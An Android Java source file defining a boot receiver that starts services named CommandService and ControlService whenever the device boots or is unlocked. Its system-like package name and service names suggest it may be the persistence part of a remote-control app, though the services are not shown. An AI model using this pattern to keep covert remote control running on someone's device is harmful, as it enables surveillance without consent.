package com.system.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_USER_PRESENT.equals(action)) {
            
            startServices(context);
        }
    }

    private void startServices(Context context) {
        Intent commandIntent = new Intent(context, CommandService.class);
        Intent controlIntent = new Intent(context, ControlService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(commandIntent);
            context.startForegroundService(controlIntent);
        } else {
            context.startService(commandIntent);
            context.startService(controlIntent);
        }
    }
}
